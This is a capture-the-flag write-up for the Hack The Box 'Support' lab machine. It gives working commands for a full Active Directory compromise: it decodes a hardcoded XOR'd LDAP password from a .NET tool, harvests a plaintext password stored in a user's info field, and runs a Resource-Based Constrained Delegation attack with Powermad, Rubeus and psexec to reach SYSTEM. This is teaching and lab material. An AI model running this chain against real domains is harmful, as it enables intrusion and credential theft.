# HTB — Support 

## Recon

Nmap shows the usual AD stack: DNS, Kerberos, LDAP, SMB, WinRM. Classic Domain Controller fingerprint.

```
nmap -sC -sV -Pn <IP>
```

SMB allows anonymous login, and there's a non-default share called `support-tools`:

```
smbclient \\\\<IP>\\support-tools
```

Inside, mostly normal installers (Putty, WireShark...) plus one odd file: `UserInfo.exe.zip`. Grabbed it.

## Cracking UserInfo.exe

```
file UserInfo.exe
# PE32 executable ... Mono/.Net assembly
```

It's .NET, so decompiling it with ILSpy gives back almost original C# source — no need to fight with raw assembly.

Inside, a class `LdapQuery` connects to LDAP as `support\ldap`, pulling the password from a `Protected.getPassword()` method. That method XORs a base64 blob with the string `"armando"` and the constant `0xDF`. XOR is its own inverse, so reproducing the exact same operations in Python gives back the real password:

```python
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e, k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
```

Output: `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

## Foothold

Bind to LDAP with the recovered password:

```
ldapsearch -H ldap://support.htb -D ldap@support.htb -w '<password>' -b "dc=support,dc=htb" "*"
```

Dumping everything, one user stands out — `support`, whose `info` field (meant for free-text notes) has a plaintext password sitting in it:

```
info: Ironside47pleasure40Watchful
```

He's also in `Remote Management Users`, so WinRM is open to him:

```
evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb
```

User flag grabbed.

## Privesc

`whoami /groups` shows `support` is in a non-default group, `Shared Support Accounts`. Running BloodHound (SharpHound collection → import) reveals that group has `GenericAll` over the Domain Controller object itself.

`GenericAll` on a computer object (not a user) is the setup for a **Resource-Based Constrained Delegation** attack: the DC can be told to trust a machine we control to delegate on behalf of anyone.

Checked the prerequisites — `ms-DS-MachineAccountQuota` is 10 (can add computers), and the delegation attribute on the DC is empty (no conflicts).

Created a fake computer with Powermad:

```
New-MachineAccount -MachineAccount FAKE-COMP01 -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
```

Configured the DC to trust it:

```
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
```

Got the fake account's hash and ran the S4U attack with Rubeus:

```
Rubeus.exe hash /password:Password123 /user:FAKE-COMP01$ /domain:support.htb

Rubeus.exe s4u /user:FAKE-COMP01$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt
```

This chains S4U2Self (get a ticket for Administrator, to ourselves) and S4U2Proxy (swap it for a ticket to the actual target service, cifs/dc.support.htb) — abusing the delegation we just set up.

Exported the final ticket, converted it for Impacket, and got a shell:

```
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
```

`NT AUTHORITY\SYSTEM`. Root flag grabbed.

## TL;DR

Anonymous SMB share → leaked .NET tool with a hardcoded, XOR'd LDAP password → LDAP enum reveals a user's plaintext password stashed in the `info` field → WinRM access → `GenericAll` on the DC via group membership → RBCD attack with a fake computer account → SYSTEM.
